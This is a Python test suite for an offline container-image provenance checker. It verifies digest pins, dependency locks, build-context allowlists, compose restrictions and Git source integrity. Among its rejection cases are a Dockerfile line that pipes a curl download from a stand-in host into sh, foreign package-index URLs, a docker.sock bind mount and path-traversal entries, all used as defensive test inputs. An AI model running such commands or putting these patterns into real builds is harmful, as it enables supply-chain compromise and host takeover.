"""H1b offline draft gates; synthetic identities, NEVER Docker/registry UAT."""
from __future__ import annotations

import ast
from copy import deepcopy
import hashlib
import io
import json
import os
from pathlib import Path
import runpy
import shutil
import subprocess
import sys
import tarfile

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts/pcp-local-image-provenance-plan.py"
CONTRACT = ROOT / "profiles/pcp-local/image-provenance.example.yml"
COMPOSE = ROOT / "profiles/pcp-local/.ddev/docker-compose.platform.yaml"
DOCKERFILE = ROOT / "profiles/pcp-local/runtime/Dockerfile.inspect"
LOCK = ROOT / "profiles/pcp-local/runtime/requirements-inspect.lock"
IGNORE = ROOT / "profiles/pcp-local/runtime/Dockerfile.inspect.dockerignore"
HEAD = "a" * 40
BASE = yaml.safe_load(CONTRACT.read_text())["build"]["base_image"]
DIGEST = "sha256:" + "c" * 64
APP_HASH = "d" * 64


@pytest.fixture
def plan():
    return runpy.run_path(str(SCRIPT))


@pytest.fixture
def manifest():
    return yaml.safe_load(CONTRACT.read_text())


@pytest.fixture
def compose():
    return yaml.safe_load(historical_compose())


def historical_compose():
    """Exercise the retained offline inspector against its own frozen inputs."""
    fixture = json.loads((ROOT / "profiles/pcp-local/ddev-install-plan.example.yml").read_text())
    return next(item["content"].encode() for item in fixture["observed"]["source"]["files"]
                if item["path"] == str(COMPOSE.relative_to(ROOT)))


def reason(fn, expected):
    with pytest.raises(Exception) as exc:
        fn()
    assert type(exc.value).__name__ == "Stop"
    assert str(exc.value) == expected


def fake_lock(plan):
    # Invented test-only hashes, never written into source artifact pins.
    return ("--require-hashes\n--only-binary=:all:\n" + "".join(
        name + "==1.2.3 --hash=sha256:" + "e" * 64 + "\n"
        for name in sorted(plan["LOCK_PACKAGES"])
    )).encode()


def evaluate(plan, manifest, compose, *, lock=None, recipe=None, app_hash=APP_HASH):
    return plan["assess"](
        manifest, head=HEAD, dockerfile=recipe or DOCKERFILE.read_bytes(),
        requirements=lock if lock is not None else LOCK.read_bytes(),
        context_ignore=IGNORE.read_bytes(),
        app_tree_sha256=app_hash, compose=compose,
    )


def complete_recipe(plan, manifest, *, lock=None):
    m = deepcopy(manifest)
    m["source_commit"] = HEAD
    m["build"].update(
        base_image=BASE,
        dockerfile_sha256=hashlib.sha256(DOCKERFILE.read_bytes()).hexdigest(),
        requirements_sha256=hashlib.sha256(lock if lock is not None else LOCK.read_bytes()).hexdigest(),
        app_tree_sha256=APP_HASH,
    )
    return m


def complete_artifact(m):
    m = deepcopy(m)
    m["artifact"].update(
        image_ref="pcp-local-runtime-inspect@" + DIGEST, digest=DIGEST,
        config_digest="sha256:" + "f" * 64, buildx_metadata_sha256="1" * 64,
        attestation_sha256="2" * 64, sbom_sha256="3" * 64,
    )
    return m


def claimed_provenance(m):
    return {
        "verifier": "independent", "statement_sha256": "4" * 64,
        "subject_digest": m["artifact"]["digest"], "source_commit": HEAD,
        **{key: m["build"][key] for key in
           ("dockerfile_sha256", "requirements_sha256", "app_tree_sha256", "context_ignore_sha256")},
    }


def test_checked_in_draft_is_unresolved_not_a_fabricated_pin(plan, manifest, compose):
    assert manifest["approval_state"] == "draft"
    assert manifest["source_commit"] is None
    assert manifest["build"]["base_image"] == plan["BASE_IMAGE"]
    assert all(v is None for v in manifest["artifact"].values())
    assert manifest["independent_provenance"] is None
    assert plan["validate_lock"](LOCK.read_bytes())
    assert evaluate(plan, manifest, compose, lock=LOCK.read_bytes()) == "SOURCE_AUTHORITY_NOT_PINNED"
    doc = complete_recipe(plan, manifest)
    assert evaluate(plan, doc, compose) == "ARTIFACT_DIGEST_NOT_ATTESTED"
    doc["build"]["base_image"] = None
    assert evaluate(plan, doc, compose) == "BUILD_RECIPE_NOT_PINNED"
    unpinned = b"--require-hashes\n--only-binary=:all:\n" + b"\n".join(
        line.split(b" --hash=")[0] for line in LOCK.read_bytes().splitlines()
        if b"==" in line and not line.startswith(b"#")
    ) + b"\n"
    doc = complete_recipe(plan, manifest, lock=unpinned)
    assert evaluate(plan, doc, compose, lock=unpinned) == "DEPENDENCY_LOCK_NOT_RESOLVED"


@pytest.mark.parametrize(("field", "value", "expected"), [
    ("source_commit", "f" * 39, "SOURCE_COMMIT_INVALID"),
    ("source_commit", "b" * 40, "SOURCE_COMMIT_MISMATCH"),
    ("source_commit", True, "SOURCE_COMMIT_INVALID"),
    ("schema_version", True, "MANIFEST_SCHEMA_INVALID"),
    ("schema_version", 1, "MANIFEST_SCHEMA_INVALID"),
    ("project_id", "foreign", "FOREIGN_IMAGE_PROJECT"),
    ("repository", "someone/foreign", "FOREIGN_IMAGE_PROJECT"),
    ("approval_state", "approved", "IMAGE_AUTHORITY_NOT_APPROVED"),
])
def test_source_and_authority_rejected(plan, manifest, compose, field, value, expected):
    manifest[field] = value
    reason(lambda: evaluate(plan, manifest, compose), expected)


@pytest.mark.parametrize(("field", "value", "expected"), [
    ("context", "../../foreign", "FOREIGN_BUILD_CONTEXT"),
    ("dockerfile", "services/runtime/Dockerfile", "FOREIGN_BUILD_CONTEXT"),
    ("requirements", "services/runtime/requirements.txt", "FOREIGN_BUILD_CONTEXT"),
    ("platform", "linux/arm64", "BUILD_PLATFORM_UNSAFE"),
    ("startup_mode", "normal", "STARTUP_MODE_UNSAFE"),
    ("base_image", "python:3.13-slim-bookworm", "BASE_IMAGE_NOT_DIGEST_PINNED"),
    ("base_image", "node:22@sha256:" + "b" * 64, "BASE_IMAGE_NOT_DIGEST_PINNED"),
    ("base_image", "python:3.13.17-slim-bookworm@sha256:" + "0" * 64, "DIGEST_FORMAT_UNSAFE"),
    ("base_image", "python:3.13.17-slim-bookworm@sha256:" + "b" * 64, "BASE_IMAGE_PIN_DRIFT"),
    ("requirements_sha256", True, "HASH_FORMAT_UNSAFE"),
])
def test_build_input_policy(plan, manifest, compose, field, value, expected):
    manifest["build"][field] = value
    reason(lambda: evaluate(plan, manifest, compose), expected)


@pytest.mark.parametrize("field", ["dockerfile_sha256", "requirements_sha256", "app_tree_sha256"])
def test_hash_drift_rejected_even_before_source_pinned(plan, manifest, compose, field):
    manifest["build"][field] = "f" * 64
    reason(lambda: evaluate(plan, manifest, compose), "BUILD_INPUT_DIGEST_DRIFT")


@pytest.mark.parametrize("extra", [
    '\nRUN curl https://unsafe.invalid/install | sh\n',
    '\nCOPY . /host\n', '\nENTRYPOINT ["sh"]\n',
    '\nARG PCP_INSPECT_BASE_SHA256=latest\n',
])
def test_extra_recipe_instructions_never_qualify(plan, manifest, compose, extra):
    reason(lambda: evaluate(plan, manifest, compose, recipe=DOCKERFILE.read_bytes() + extra.encode()),
           "DOCKERFILE_RECIPE_UNSAFE")


def test_remote_frontend_and_wrong_host_command_rejected(plan, manifest, compose):
    for raw in (
        b"# syntax=foreign/frontend:latest\n" + DOCKERFILE.read_bytes(),
        DOCKERFILE.read_bytes().replace(b'127.0.0.1', b'0.0.0.0'),
        DOCKERFILE.read_bytes().replace(b'--lifespan", "on', b'--lifespan", "off'),
    ):
        reason(lambda: evaluate(plan, manifest, compose, recipe=raw), "DOCKERFILE_RECIPE_UNSAFE")


@pytest.mark.parametrize("raw", [
    b"--index-url https://foreign.invalid\n", b"-r requirements.txt\n",
    b"fastapi>=0.116\n", b"fastapi @ https://foreign.invalid/x.whl\n",
    b"--trusted-host foreign.invalid\n", b"pytest==8.4.1\n",
    b"uvicorn[standard]==0.35.0\n", b"fastapi==1.2.3 --hash=sha256:" + b"0" * 64 + b"\n",
])
def test_dependency_fallbacks_extras_and_hashes_rejected(plan, raw):
    prefix = b"--require-hashes\n--only-binary=:all:\n"
    reason(lambda: plan["validate_lock"](prefix + raw), "DEPENDENCY_LOCK_UNSAFE"
           if b"0" * 64 not in raw else "HASH_FORMAT_UNSAFE")


def test_lock_complete_syntax_does_not_claim_availability(plan):
    assert plan["validate_lock"](fake_lock(plan)) is True
    assert plan["validate_lock"](fake_lock(plan).replace(b" --hash=", b" \\\n --hash=")) is True
    raw = fake_lock(plan) + fake_lock(plan).splitlines(keepends=True)[2]
    reason(lambda: plan["validate_lock"](raw), "DEPENDENCY_LOCK_UNSAFE")


@pytest.mark.parametrize(("field", "value", "expected"), [
    ("image_ref", "personal-coding-platform-coding-runtime:local", "UNSAFE_IMAGE_REFERENCE"),
    ("image_ref", "pcp-local-runtime-inspect:latest", "UNSAFE_IMAGE_REFERENCE"),
    ("image_ref", "foreign@" + DIGEST, "UNSAFE_IMAGE_REFERENCE"),
    ("digest", "sha256:bad", "DIGEST_FORMAT_UNSAFE"),
    ("config_digest", "sha256:" + "0" * 64, "DIGEST_FORMAT_UNSAFE"),
    ("sbom_sha256", "0" * 64, "HASH_FORMAT_UNSAFE"),
])
def test_unsafe_artifact_identity(plan, manifest, compose, field, value, expected):
    manifest["artifact"][field] = value
    reason(lambda: evaluate(plan, manifest, compose), expected)


def test_image_attestation_and_material_mismatches(plan, manifest, compose):
    doc = complete_artifact(complete_recipe(plan, manifest))
    doc["artifact"]["image_ref"] = "pcp-local-runtime-inspect@sha256:" + "9" * 64
    reason(lambda: evaluate(plan, doc, compose), "IMAGE_DIGEST_MISMATCH")
    doc = complete_artifact(complete_recipe(plan, manifest))
    for field, value, expected in (
        ("subject_digest", "sha256:" + "9" * 64, "ATTESTATION_SUBJECT_MISMATCH"),
        ("source_commit", "b" * 40, "ATTESTATION_SOURCE_MISMATCH"),
        ("requirements_sha256", "9" * 64, "ATTESTATION_MATERIALS_MISMATCH"),
    ):
        doc["independent_provenance"] = {**claimed_provenance(doc), field: value}
        reason(lambda: evaluate(plan, doc, compose), expected)


@pytest.mark.parametrize(("field", "value", "expected"), [
    ("exporter", "classic_load", "ATTESTATION_EXPORT_UNSAFE"),
    ("exporter", "docker", "ATTESTATION_EXPORT_UNSAFE"),
    ("image_store", "classic", "IMAGE_STORE_ATTESTATION_UNSAFE"),
    ("image_store", "unknown", "IMAGE_STORE_ATTESTATION_UNSAFE"),
    ("provenance_mode", "min", "ATTESTATION_POLICY_UNSAFE"),
    ("sbom_required", False, "ATTESTATION_POLICY_UNSAFE"),
])
def test_store_and_attestation_policy(plan, manifest, compose, field, value, expected):
    manifest["evidence"][field] = value
    reason(lambda: evaluate(plan, manifest, compose), expected)


def test_all_claimed_evidence_registry_unavailable_still_stop(plan, manifest, compose):
    doc = complete_recipe(plan, manifest)
    assert evaluate(plan, doc, compose) == "ARTIFACT_DIGEST_NOT_ATTESTED"
    doc = complete_artifact(doc)
    assert evaluate(plan, doc, compose) == "IMAGE_STORE_NOT_ATTESTED"
    for exporter in ("registry", "oci_layout"):
        doc["evidence"].update(exporter=exporter, image_store=exporter)
        assert evaluate(plan, doc, compose) == "INDEPENDENT_ATTESTATION_NOT_VERIFIED"
        doc["independent_provenance"] = claimed_provenance(doc)
        assert evaluate(plan, doc, compose) == "INDEPENDENT_ATTESTATION_NOT_VERIFIED"
    doc["evidence"]["image_store"] = "containerd"
    reason(lambda: evaluate(plan, doc, compose), "IMAGE_STORE_EXPORT_MISMATCH")


@pytest.mark.parametrize(("key", "value"), [
    ("profiles", []), ("image", "personal-coding-platform-coding-runtime:local"),
    ("pull_policy", "always"), ("command", ["python", "-m", "uvicorn", "app.main:app"]),
    ("read_only", 1), ("cap_drop", []), ("restart", "always"),
    ("environment", {"PCP_LOCAL_TASK_WORKER_ENABLED": "1"}),
    ("volumes", [{"type": "bind", "source": "/var/run/docker.sock"}]),
])
def test_compose_exact_parked_contract(plan, manifest, compose, key, value):
    compose["services"]["coding-runtime"][key] = value
    reason(lambda: evaluate(plan, manifest, compose), "COMPOSE_NOT_PARKED")


@pytest.mark.parametrize("key", [
    "ports", "expose", "build", "privileged", "entrypoint", "env_file", "secrets",
    "devices", "volumes_from", "network_mode", "healthcheck", "post_start",
])
def test_compose_capability_expansion(plan, manifest, compose, key):
    compose["services"]["coding-runtime"][key] = {"unsafe": True}
    reason(lambda: evaluate(plan, manifest, compose), "COMPOSE_UNSAFE")


def test_unknown_manifest_keys_and_bad_provenance_shape(plan, manifest, compose):
    for section in (manifest, manifest["artifact"], manifest["evidence"]):
        section["activate"] = True
        reason(lambda: evaluate(plan, manifest, compose), "MANIFEST_SCHEMA_INVALID")
        section.pop("activate")
    manifest["independent_provenance"] = {"verifier": "independent"}
    reason(lambda: evaluate(plan, manifest, compose), "INDEPENDENT_PROVENANCE_SHAPE_INVALID")


def test_app_inputs_digest_and_symlink_guard(plan, tmp_path):
    fn = plan["app_inputs"]
    globals_ = fn.__globals__
    app = tmp_path / "app"
    app.mkdir()
    (app / "main.py").write_text("x = 1\n")
    (app / "__init__.py").write_bytes(b"")
    globals_.update(ROOT=tmp_path, APP=app)
    first = plan["app_digest"](fn())
    (app / "main.py").write_text("x = 2\n")
    assert plan["app_digest"](fn()) != first
    (app / "foreign.py").symlink_to(tmp_path / "missing.py")
    reason(fn, "SOURCE_FILE_UNSAFE")
    (app / "foreign.py").unlink()
    (app / "secret.env").write_text("fake")
    reason(fn, "APP_NON_PYTHON_INPUT_UNSAFE")


@pytest.mark.parametrize(("fault", "expected"), [
    ("dirty", "SOURCE_NOT_CLEAN"), ("wrong_origin", "WRONG_SOURCE_ORIGIN"),
    ("wrong_root", "WRONG_SOURCE_ROOT"), ("bad_head", "SOURCE_SHA_INVALID"),
])
def test_checkout_guards_without_real_git(plan, monkeypatch, fault, expected):
    fn = plan["check_checkout"]
    monkeypatch.setattr(os, "geteuid", lambda: 1000)
    for key in plan["DANGEROUS_ENV"]:
        monkeypatch.delenv(key, raising=False)
    def git(*args):
        if args == ("rev-parse", "--show-toplevel"):
            return "/foreign" if fault == "wrong_root" else str(ROOT)
        if args == ("remote", "get-url", "origin"):
            return "foreign" if fault == "wrong_origin" else sorted(plan["ORIGINS"])[0]
        if args == ("rev-parse", "HEAD"):
            return "bad" if fault == "bad_head" else HEAD
        return " M fake" if fault == "dirty" else ""
    fn.__globals__["git_read"] = git
    reason(fn, expected)


def test_source_only_cli_no_build_or_default_host_action(plan, capsys):
    assert plan["main"](["--build"]) == 2
    assert "PCP_H1A_REASON=USAGE_SOURCE_ONLY" in capsys.readouterr().out
    fn = plan["main"]
    fn.__globals__["check_checkout"] = lambda: HEAD
    fn.__globals__["immutable_source_snapshot"] = lambda head: {
        "manifest": CONTRACT.read_bytes(), "profile": historical_compose(),
        "files": {str(p.relative_to(ROOT)): p.read_bytes() for p in (DOCKERFILE, LOCK, IGNORE)},
        "app_tree_sha256": APP_HASH,
    }
    assert fn(["--check"]) == 2
    out = capsys.readouterr().out
    assert "PCP_H1A_REASON=SOURCE_AUTHORITY_NOT_PINNED" in out
    assert "PCP_H1A_IMAGE_BUILD=NOT_RUN" in out
    assert "PCP_B22C1_LIVE=STOP" in out
    tree = ast.parse(SCRIPT.read_text())
    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call)
             and isinstance(n.func, ast.Attribute) and n.func.attr == "Popen"]
    assert len(calls) == 1  # existing allowlisted read-only Git helper only
    assert '"git", "-C"' in SCRIPT.read_text()
    for name in ('"docker",', '"ddev",', '"buildx",'):
        assert name not in SCRIPT.read_text()
    imported = {n.names[0].name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import)}
    imported |= {n.module.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.ImportFrom)}
    assert not imported & {"urllib", "requests", "httpx", "socket"}


def test_new_source_paths_classified_protected():
    policy = runpy.run_path(str(ROOT / "scripts/check_project_doc_authority.py"))
    for path in (SCRIPT, CONTRACT, DOCKERFILE, LOCK, IGNORE, COMPOSE):
        assert policy["classify_path"](str(path.relative_to(ROOT))) == "protected"


def test_actual_app_import_and_synthetic_image_lifespan_no_io(tmp_path):
    """Real app, ASGI only, no TCP/container/DB. Host dependencies are not lock proof."""
    pytest.importorskip("fastapi")
    pytest.importorskip("httpx")
    pytest.importorskip("psycopg")
    # Recreate only the source COPY payload, not a Docker image or OS filesystem.
    app = tmp_path / "app"
    shutil.copytree(ROOT / "services/runtime/app", app,
                    ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    for name in ("projects.pcp-local.yml", "project-baselines.pcp-local.yml"):
        shutil.copyfile(ROOT / "config" / name, tmp_path / name)
    code = r'''
import asyncio, importlib, importlib.abc, os, pathlib, socket, subprocess, sys
class NoOptionalTools(importlib.abc.MetaPathFinder):
    def find_spec(self, fullname, *args):
        if fullname.split(".")[0] in {"uvloop", "httptools", "watchfiles", "dotenv", "websockets"}:
            raise ModuleNotFoundError("optional protocol dependency absent in inspection image")
sys.meta_path.insert(0, NoOptionalTools())
sys.path.insert(0, os.getcwd())
def forbidden(*args, **kwargs):
    raise AssertionError("external I/O or process execution in inspection")
socket.socket.connect = forbidden
socket.getaddrinfo = forbidden
subprocess.Popen = forbidden
import psycopg
psycopg.connect = forbidden
import httpx
httpx.HTTPTransport.handle_request = forbidden
httpx.AsyncHTTPTransport.handle_async_request = forbidden
m = importlib.import_module("app.main")
async def run():
    tasks = asyncio.all_tasks()
    async with m.lifespan(m.app):
        assert asyncio.all_tasks() == tasks
        assert m.engine.worker_task is None
        assert m.engine.queue.empty()
        assert not m.engine.active_jobs
        transport = httpx.ASGITransport(app=m.app)
        async with httpx.AsyncClient(transport=transport, base_url="http://synthetic") as c:
            result = await c.get("/health")
            assert result.status_code == 200
            data = result.json()
            assert data["status"] == "degraded"
            assert data["router"] == data["executor"] == "not_checked"
            assert not any(data["adapters"].values())
            for method, path in [("GET", "/v1/jobs"), ("POST", "/v1/intake"),
                                 ("GET", "/docs"), ("GET", "/dashboard")]:
                assert (await c.request(method, path)).status_code == 503
            os.environ["PCP_RUNTIME_STARTUP_MODE"] = "normal"
            assert (await c.get("/health")).status_code == 503
    assert asyncio.all_tasks() == tasks
    try:
        async with m.lifespan(m.app):
            raise AssertionError("mode override reached legacy startup")
    except RuntimeError as exc:
        assert "PCP-local" in str(exc)
asyncio.run(run())
# Exercise the selected minimal uvicorn protocol imports without binding a port.
import uvicorn
config = uvicorn.Config(m.app, loop="asyncio", http="h11", lifespan="on", ws="none")
config.load()
print("SYNTHETIC_INSPECTION_NO_IO=PASS")
'''
    interpreter = os.getenv("PCP_H1B2_MINIMAL_PYTHON", sys.executable)
    env = {
        "PATH": str(Path(interpreter).parent),
        "PCP_RUNTIME_STARTUP_MODE": "pcp_local_inspect",
        "PROJECTS_FILE": str(tmp_path / "projects.pcp-local.yml"),
        "PROJECT_BASELINES_FILE": str(tmp_path / "project-baselines.pcp-local.yml"),
    }
    result = subprocess.run([interpreter, "-I", "-B", "-c", code],
                            cwd=tmp_path, env=env, capture_output=True, text=True, timeout=30)
    assert result.returncode == 0, result.stderr
    assert "SYNTHETIC_INSPECTION_NO_IO=PASS" in result.stdout


def context_cases():
    allowed = {line[1:] for line in IGNORE.read_text().splitlines() if line.startswith("!")}
    forbidden = {
        ".git/config", ".env", ".env.local", ".ddev/config.yaml", "docs/project/constitution.md",
        "credentials.json", "workspaces/foreign/main.py", "chonhac/src/main.py",
        "services/runtime/Dockerfile", "services/runtime/app/secret.env",
        "services/runtime/app/unreviewed.py", "services/runtime/app/__pycache__/main.pyc",
        "services/runtime/app/nested/unreviewed.py", "profiles/pcp-local/runtime/secrets.json",
    }
    for path in allowed:
        forbidden.update({path + ".secret", path + "/secret.env",
                          path + "/unexpected.py", "foreign/" + path})
    return allowed, forbidden


def test_context_matches_pinned_upstream_moby_oracle(plan):
    # Actual upstream v0.6.0 was run during source research, with this exact
    # 524-case matrix (not a Python replacement for Docker glob semantics).
    # Commit 347bb8d8d557f90d1b75cd8bca3c0177f380a979; module sum in README.
    allowed, forbidden = context_cases()
    assert len(allowed) == 102 and len(forbidden) == 422
    assert plan["context_paths"](IGNORE.read_bytes()) == allowed
    expected = {path: path in allowed for path in sorted(allowed | forbidden)}
    canonical = json.dumps(expected, sort_keys=True, separators=(",", ":")).encode()
    assert hashlib.sha256(canonical).hexdigest() == (
        "80635ae24ce7eeacbd1400d3f605d3594a37724a3a97b5fdf91a9135060bf4d6"
    )
    # Optional research-only upstream helper, supplied by the operator. No
    # Docker, Go installation or module/network download happens in tests.
    oracle = os.getenv("PCP_H1B2_MOBY_ORACLE")
    if oracle:
        result = subprocess.run([oracle], input=json.dumps({
            "Ignore": str(IGNORE), "Paths": sorted(expected),
        }), text=True, capture_output=True, timeout=15, check=True)
        assert json.loads(result.stdout) == expected


@pytest.mark.parametrize("fault", [
    "no_deny", "glob_allow", "foreign", "dotdot", "absolute", "backslash",
    "duplicate", "missing_file", "child_denials_missing", "late_reinclude",
])
def test_context_policy_rejects_ambiguous_or_expanded_rules(plan, fault):
    raw = IGNORE.read_bytes()
    if fault == "no_deny": raw = raw.replace(b"\n**\n", b"\n")
    if fault == "glob_allow": raw += b"!services/runtime/app/**\n"
    if fault == "foreign": raw += b"!.git/config\n"
    if fault == "dotdot": raw += b"!services/runtime/app/../secret.py\n"
    if fault == "absolute": raw += b"!/services/runtime/app/evil.py\n"
    if fault == "backslash": raw += b"!services\\runtime\\app\\evil.py\n"
    if fault == "duplicate": raw += b"!services/runtime/app/main.py\n"
    if fault == "missing_file": raw = raw.replace(b"!services/runtime/app/main.py\n", b"")
    if fault == "child_denials_missing": raw = raw.replace(b"services/runtime/app/main.py/*\n", b"")
    if fault == "late_reinclude": raw += b"!services/runtime/app/main.py/secret.env\n"
    with pytest.raises(Exception) as exc:
        plan["context_paths"](raw)
    assert type(exc.value).__name__ == "Stop"
    assert str(exc.value).startswith("CONTEXT_")


def test_source_context_tar_is_exact_deterministic_regular_files(plan):
    inputs = plan["app_inputs"]()
    kwargs = dict(dockerfile=DOCKERFILE.read_bytes(), requirements=LOCK.read_bytes(),
                  context_ignore=IGNORE.read_bytes(), inputs=inputs)
    raw = plan["source_context"](**kwargs)
    assert raw == plan["source_context"](**{**kwargs, "inputs": dict(reversed(list(inputs.items())))})
    expected = {"services/runtime/app/" + name: value for name, value in inputs.items()}
    expected.update({str(p.relative_to(ROOT)): p.read_bytes() for p in (DOCKERFILE, LOCK, IGNORE)})
    with tarfile.open(fileobj=io.BytesIO(raw), mode="r:") as archive:
        members = archive.getmembers()
        assert len(members) == len(expected) == 103
        assert {item.name for item in members} == set(expected)
        for item in members:
            assert item.isfile() and not item.issym() and not item.islnk()
            assert item.uid == item.gid == item.mtime == 0
            assert item.mode == 0o644
            assert archive.extractfile(item).read() == expected[item.name]
    # Neighbors/credentials/unknown Python files cannot enter the payload.
    for name in ("unreviewed.py", "../secret.py", "/absolute.py", "main.py/secret.env"):
        bad = {**inputs, name: b"fake secret"}
        reason(lambda: plan["source_context"](**{**kwargs, "inputs": bad}),
               "CONTEXT_INPUT_SET_MISMATCH")
    bad = dict(inputs)
    bad.pop("main.py")
    reason(lambda: plan["source_context"](**{**kwargs, "inputs": bad}),
           "CONTEXT_INPUT_SET_MISMATCH")


def test_context_digest_binding_and_platform_index_cannot_replace_manifest(plan, manifest, compose):
    manifest["build"]["context_ignore_sha256"] = "9" * 64
    reason(lambda: evaluate(plan, manifest, compose), "BUILD_INPUT_DIGEST_DRIFT")
    manifest["build"]["context_ignore_sha256"] = hashlib.sha256(IGNORE.read_bytes()).hexdigest()
    manifest["build"]["base_image"] = (
        "python:3.13.17-slim-bookworm@sha256:e32be0e55814a08977501ca863271d9bd02443710db8f2afaf8372e2c4508530"
    )
    reason(lambda: evaluate(plan, manifest, compose), "BASE_IMAGE_PIN_DRIFT")


def test_actual_wheel_hash_corruption_and_context_resource_limit(plan, manifest, compose):
    lock = LOCK.read_bytes()
    first_hash = next(line.split(b"--hash=sha256:")[1] for line in lock.splitlines() if b"--hash=sha256:" in line)
    changed = lock.replace(first_hash, b"f" * 64, 1)
    reason(lambda: evaluate(plan, manifest, compose, lock=changed), "BUILD_INPUT_DIGEST_DRIFT")
    inputs = plan["app_inputs"]()
    inputs["main.py"] = b"x" * (1024 * 1024 + 1)
    reason(lambda: plan["source_context"](
        dockerfile=DOCKERFILE.read_bytes(), requirements=lock,
        context_ignore=IGNORE.read_bytes(), inputs=inputs,
    ), "CONTEXT_RESOURCE_BOUND")


ANCHOR = "7b8b2617973285365a6e4efe79b0d4e350ad64bf"


def frozen_archive(plan, files):
    return plan["source_context"](
        dockerfile=files[str(DOCKERFILE.relative_to(ROOT))],
        requirements=files[str(LOCK.relative_to(ROOT))],
        context_ignore=files[str(IGNORE.relative_to(ROOT))],
        inputs={path.removeprefix("services/runtime/app/"): raw for path, raw in files.items()
                if path.startswith("services/runtime/app/")},
    )


def test_actual_reviewed_git_objects_reproduce_canonical_source_bytes(plan):
    # Real immutable Git objects from the reviewed inspection-image snapshot.
    # New Runtime implementation HEADs do not amend that historical image pin.
    # Hosted Structure checkout already contains the anchor; never fetch/fallback.
    # Expected bytes are checked AFTER generation, never used
    # as a substitute for reading, hashing and assembling the 103 source blobs.
    files = plan["_read_git_inputs"](ANCHOR)
    assert len(files) == 103
    assert sum(path.startswith("services/runtime/app/") for path in files) == 100
    archive = frozen_archive(plan, files)
    assert len(archive) == 1740800
    assert hashlib.sha256(archive).hexdigest() == (
        "cb766b4845bcf77759f51e74041a4e0e379ab37a869eeb99bb0b682bdbcfc39b")
    assert archive == frozen_archive(plan, dict(reversed(list(files.items()))))
    with tarfile.open(fileobj=io.BytesIO(archive), mode="r:") as tar:
        assert [m.name for m in tar] == sorted(files)
        for m in tar.getmembers():
            assert m.type == tarfile.REGTYPE and m.mode == 0o644
            assert m.uid == m.gid == m.mtime == 0
            assert m.uname == m.gname == ""
            assert tar.extractfile(m).read() == files[m.name]


def test_current_head_cannot_replace_reviewed_inspection_app_tree(plan):
    # Exercise actual HEAD independently of the historical positive. No mocked
    # Git/tree result, skipped test or fallback to the anchor on rejection.
    head = plan["git_read"]("rev-parse", "HEAD")
    current_tree = plan["git_read"]("rev-parse", head + ":services/runtime/app")
    if current_tree != plan["APP_TREE"]:
        reason(lambda: plan["_read_git_inputs"](head), "SOURCE_APP_TREE_MISMATCH")
    else:
        # A future HEAD with the exact approved app tree need not contradict
        # the unchanged policy: it must still pass its full input inventory.
        assert len(plan["_read_git_inputs"](head)) == 103


@pytest.mark.parametrize("entry", [
    b"120000 blob " + b"a" * 40 + b" 5\tservices/runtime/app/link.py\0",
    b"100755 blob " + b"a" * 40 + b" 5\tservices/runtime/app/main.py\0",
    b"160000 commit " + b"a" * 40 + b" -\tservices/runtime/app/submodule\0",
    b"100644 blob " + b"a" * 40 + b" 1048577\tservices/runtime/app/main.py\0",
    b"100644 blob " + b"a" * 40 + b" 1\tmain.py\0" * 300,
    b"malformed\0",
])
def test_git_inventory_rejects_modes_symlinks_submodules_duplicates_and_size(plan, entry):
    fn = plan["_git_entries"]
    fn.__globals__["git_bytes"] = lambda *a, **kw: entry
    with pytest.raises(plan["Stop"]):
        fn(ANCHOR, "services/runtime/app")


@pytest.mark.parametrize("raw,size,oid,code", [
    (b"a", 2, "a" * 40, "SOURCE_GIT_BLOB_UNSAFE"),
    (b"\0", 1, "a" * 40, "SOURCE_GIT_BLOB_UNSAFE"),
    (b"changed", 7, "a" * 40, "SOURCE_GIT_BLOB_MISMATCH"),
])
def test_git_blob_size_and_identity_are_verified(plan, raw, size, oid, code):
    fn = plan["_git_blob"]
    fn.__globals__["git_bytes"] = lambda *a, **kw: raw
    reason(lambda: fn((oid, size)), code)


def test_git_inventory_extra_missing_and_tree_substitution(plan):
    fn = plan["_read_git_inputs"]
    original = fn.__globals__["_git_entries"]
    commit = ANCHOR
    entries = original(commit, *plan["SOURCE_PATHS"])
    for changed in ({**entries, "services/runtime/app/unreviewed.py": ("a" * 40, 1)},
                    {k: v for k, v in entries.items() if not k.endswith("main.py")}):
        fn.__globals__["_git_entries"] = lambda *a: changed
        reason(lambda: fn(commit), "CONTEXT_INPUT_SET_MISMATCH")
    fn.__globals__["_git_entries"] = original
    fn.__globals__["git_read"] = lambda *a: commit if "--verify" in a else "b" * 40
    reason(lambda: fn(commit), "SOURCE_APP_TREE_MISMATCH")


def test_snapshot_frozen_once_no_mutable_path_reads_and_head_race(plan):
    commit = ANCHOR
    files = plan["_read_git_inputs"](commit)
    fn = plan["immutable_source_snapshot"]
    calls = []
    def frozen(commit):
        calls.append(commit)
        return files
    def forbidden(*args, **kwargs):
        raise AssertionError("mutable path was read")
    g = fn.__globals__
    g.update(check_checkout=lambda: commit, _read_git_inputs=frozen,
             read_exact=forbidden, app_inputs=forbidden)
    snapshot = fn(commit)
    assert calls == [commit]
    assert snapshot["archive"] == frozen_archive(plan, files)
    assert snapshot["commit"] == commit
    reason(lambda: fn("a" * 40), "SOURCE_COMMIT_MISMATCH")
    heads = iter([commit, "b" * 40])
    g["check_checkout"] = lambda: next(heads)
    reason(lambda: fn(commit), "SOURCE_CHANGED_DURING_SNAPSHOT")


def test_git_helper_bounded_output_sanitized_environment_and_no_other_command(plan, monkeypatch):
    reason(lambda: plan["git_bytes"]("fetch", "origin"), "SOURCE_GIT_OPERATION_UNSAFE")
    reason(lambda: plan["git_bytes"]("rev-parse", "HEAD", limit=1), "SOURCE_GIT_OUTPUT_LIMIT")
    seen = []
    original = subprocess.Popen
    def capture(*args, **kwargs):
        seen.append((args, kwargs))
        return original(*args, **kwargs)
    monkeypatch.setenv("SECRET_FAKE_TEST_TOKEN", "must-not-be-inherited")
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setattr(subprocess, "Popen", capture)
    assert plan["git_bytes"]("rev-parse", "HEAD").strip()
    argv, kw = seen[0]
    assert argv[0][0] == "git" and kw["stdin"] == subprocess.DEVNULL
    assert set(kw["env"]) <= {"PATH", "LANG", "LC_ALL", "GIT_OPTIONAL_LOCKS",
                             "GIT_TERMINAL_PROMPT", "GIT_CONFIG_NOSYSTEM", "GIT_CONFIG_GLOBAL"}
